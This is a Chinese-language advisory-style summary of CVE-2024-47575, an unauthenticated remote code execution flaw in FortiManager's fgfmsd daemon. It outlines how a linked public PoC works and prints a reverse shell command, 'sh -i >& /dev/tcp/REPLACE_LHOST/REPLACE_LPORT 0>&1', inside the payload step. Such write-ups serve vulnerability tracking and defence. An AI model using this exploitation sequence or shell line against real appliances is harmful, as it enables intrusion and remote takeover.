## CVE-2024-47575-FortiManager-Missing Authentication

**漏洞编号:** CVE-2024-47575

**漏洞类型:** 未授权访问

**影响应用:** FortiManager

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 7.6.0, 7.4.0 <= version <= 7.4.4, 7.2.0 <= version <= 7.2.7, 7.0.0 <= version <= 7.0.12, 6.4.0 <= version <= 6.4.14, 6.2.0 <= version <= 6.2.12

**利用条件:** 目标FortiManager实例暴露在互联网上，端口541可访问。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-47575 是 FortiManager 中的一个严重漏洞，是由于 fgfmsd 守护进程缺少身份验证所致。未经过身份验证的远程攻击者可以通过特制的请求执行任意代码或命令。

**利用方式：**

1.  **建立SSL连接：** POC 首先与目标 FortiManager 实例的 541 端口建立 SSL 连接。
2.  **发送请求：** POC 发送一系列精心构造的请求，包括：
    *   `get ip`: 获取目标 IP 地址。
    *   `get auth`: 获取认证信息。
    *   `get file_exchange`:  该请求触发漏洞，服务器返回一个 `remote_id`。
3.  **利用漏洞执行代码：** POC 使用获取的 `remote_id` 构造 `channel` 请求，并在请求中包含 JSON payload，payload 中的 `file` 参数包含反向 shell 命令，反弹shell到攻击者指定的 lhost 和 lport。 `sh -i >& /dev/tcp/REPLACE_LHOST/REPLACE_LPORT 0>&1`

**有效性：**

根据漏洞信息、搜索结果以及 POC 代码，该 POC 应该有效。漏洞细节表明这是一个无需认证的远程代码执行漏洞，POC 代码实现了利用漏洞所需的步骤。

**投毒风险：**

对提供的 POC 代码进行了分析，没有发现明显的恶意或投毒代码。该代码主要功能是建立连接、发送请求并利用漏洞。但是，使用任何未经审计的第三方代码都存在风险。此POC的危险在于它会尝试在目标系统上执行任意代码，如果目标是蜜罐或者安全研究环境，会留下恶意行为的痕迹。因此，虽然代码本身没有发现投毒，但使用不当仍可能产生负面影响。


**项目地址:** [revanslbw/CVE-2024-47575-POC](https://github.com/revanslbw/CVE-2024-47575-POC)

**漏洞详情:** [CVE-2024-47575](https://nvd.nist.gov/vuln/detail/CVE-2024-47575)